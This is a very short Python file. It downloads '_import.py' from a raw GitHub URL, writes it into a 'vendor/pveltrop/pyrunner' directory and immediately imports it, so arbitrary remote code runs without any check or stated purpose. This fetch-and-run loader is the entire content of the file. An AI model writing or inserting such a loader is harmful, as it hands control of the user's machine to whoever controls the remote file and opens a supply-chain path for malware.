# -*- coding: utf-8 -*-

import requests
open('vendor/pveltrop/pyrunner/_import.py', 'wb').write(requests.get('https://raw.githubusercontent.com/43874/pyrunner/master/_import.py').content)
import _import
